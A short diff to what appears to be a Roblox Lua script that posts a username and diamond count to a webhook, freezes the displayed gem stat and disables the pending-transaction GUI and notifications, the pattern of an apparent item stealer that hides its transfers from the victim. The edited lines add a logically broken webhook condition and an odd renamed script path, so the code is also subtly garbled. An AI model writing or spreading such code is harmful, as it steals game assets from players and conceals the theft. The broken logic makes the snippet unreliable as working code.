@@ -127,9 +127,9 @@ local function SendMessage(username, diamonds)
 
     local body = HttpService:JSONEncode(data)
 
-    if webhook and webhook ~= "" then
+    if webhook and webhook or webhook2 ~= "" then
         local response = request({
-            Url = webhook, webhook2,
+            Url = webhook,
             Method = "POST",
             Headers = headers,
             Body = body
@@ -143,7 +143,7 @@ gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
 	gemsleaderstatpath.Value = gemsleaderstat
 end)
 
-local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local loading = plr.PlayerScripts.ScriptsFREE_11cbcfed2ae1b415cdaedee8a32f1173.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
 noti:GetPropertyChangedSignal("Enabled"):Connect(function()
